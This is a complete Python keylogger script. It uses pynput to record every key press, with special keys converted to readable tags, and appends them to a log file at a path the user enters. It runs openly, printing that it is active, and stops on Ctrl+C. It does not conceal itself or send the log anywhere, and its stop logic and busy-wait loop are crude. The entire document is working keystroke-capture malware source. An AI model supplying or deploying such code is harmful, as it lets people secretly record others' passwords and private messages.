from pynput.keyboard import Listener

def write_to_log(key, log_file):
    key = str(key)
    with open(log_file, 'a') as f:
        if key == 'Key.space':
            f.write(' ')
        elif key == 'Key.enter':
            f.write('\n')
        elif key == 'Key.backspace':
            f.write('[BACKSPACE]')
        elif key == 'Key.shift':
            f.write('[SHIFT]')
        elif key == 'Key.ctrl_l' or key == 'Key.ctrl_r':
            f.write('[CTRL]')
        elif key == 'Key.alt_l' or key == 'Key.alt_r':
            f.write('[ALT]')
        else:
            f.write(key.replace("'", ""))
    print("Key logged:", key)

def main():
    log_file = input("Enter the directory and filename to save keystrokes log (e.g., /path/to/keystrokes.log): ")
    print("Keylogger is now active. Press Ctrl+C to stop.")

    stop_flag = False

    def on_stop():
        nonlocal stop_flag
        stop_flag = True

    with Listener(on_press=lambda key: write_to_log(key, log_file)) as listener:
        listener.stop = on_stop
        try:
            while not stop_flag:
                pass  
        except KeyboardInterrupt:
            pass  
    print("\nKeylogger stopped.")

if __name__ == "__main__":
    main()
